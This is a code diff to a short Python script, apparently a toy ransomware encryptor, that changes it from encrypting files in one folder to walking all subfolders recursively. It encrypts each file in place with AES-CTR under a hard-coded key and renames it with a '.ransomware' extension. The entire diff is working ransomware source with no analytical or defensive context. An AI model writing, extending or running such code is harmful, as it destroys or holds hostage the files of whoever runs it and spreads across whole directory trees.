@@ -1,17 +1,20 @@
 import os
 import pyaes
 
-for name in os.listdir("./"):
-    if name != "decrypt.py" and name != "encrypt.py":
-        with open(name, "rb") as file:
-            file_data = file.read()
+for root, dir, files in os.walk("./"):
+    for f in files:
+        if f != "decrypt.py" and f != "encrypt.py" and f.split(".")[-1] != "ransomware":
+            name = os.path.join(root, f)
 
-        key = b"secretencryptkey"
-        aes = pyaes.AESModeOfOperationCTR(key)
+            with open(name, "rb") as file:
+                file_data = file.read()
 
-        data_encrypt = aes.encrypt(file_data)
+            key = b"secretencryptkey"
+            aes = pyaes.AESModeOfOperationCTR(key)
 
-        with open(name, "wb") as file:
-            file.write(data_encrypt)
+            data_encrypt = aes.encrypt(file_data)
 
-        os.rename("./{}".format(name), "./{}.ransomware".format(name))
+            with open(name, "wb") as file:
+                file.write(data_encrypt)
+
+            os.rename(name, f"{name}.ransomware")
